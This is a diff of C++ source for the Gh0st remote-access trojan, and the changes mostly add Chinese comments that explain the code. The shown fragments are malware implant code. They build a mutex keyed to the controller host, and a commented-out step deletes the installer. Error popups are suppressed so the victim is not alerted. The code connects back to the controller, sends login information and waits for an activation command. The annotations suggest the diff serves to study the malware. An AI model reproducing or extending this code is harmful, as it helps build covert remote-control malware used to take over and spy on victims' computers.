@@ -12,9 +12,9 @@ DWORD g_dwServiceType;
 enum
 {
 	NOT_CONNECT, //  还没有连接
-	GETLOGINFO_ERROR,
-	CONNECT_ERROR,
-	HEARTBEATTIMEOUT_ERROR
+	GETLOGINFO_ERROR,//获取信息失败
+	CONNECT_ERROR,//链接失败
+	HEARTBEATTIMEOUT_ERROR //心跳超时链接失败
 };
 
 DWORD WINAPI main(char *lpServiceName);
@@ -53,9 +53,9 @@ DWORD WINAPI main(char *lpServiceName)
 		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // 随机事件名
 
 		hInstallMutex = CreateMutex(NULL, true, g_strHost);
-		//ReConfigService(strServiceName);   //--lang--
+		//ReConfigService(strServiceName); 
 		// 删除安装文件
-	//	DeleteInstallFile(lpServiceName);     //--lang--
+	//	DeleteInstallFile(lpServiceName);  
 	}
 	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
 	SetErrorMode(SEM_FAILCRITICALERRORS);
@@ -115,6 +115,8 @@ DWORD WINAPI main(char *lpServiceName)
 		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
 		//---注意这里连接成功后声明了一个CKernelManager 到CKernelManager类查看一下
 		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
+		//socketClient中的主回调函数设置位这CKernelManager类中的OnReceive 
+		//（每个功能类都有OnReceive函数来处理接受的数据他们都继承自父类CManager）
 		socketClient.setManagerCallBack(&manager);
 
 		//////////////////////////////////////////////////////////////////////////
@@ -123,14 +125,14 @@ DWORD WINAPI main(char *lpServiceName)
 		{
 			Sleep(1000);
 		}
-		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
+		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接，获取是否有效标志
 		if (!manager.IsActived())
 			continue;
 
 		//////////////////////////////////////////////////////////////////////////
 
 		DWORD	dwIOCPEvent;
-		dwTickCount = GetTickCount();
+		dwTickCount = GetTickCount();//获取时间戳
 
 		do
 		{
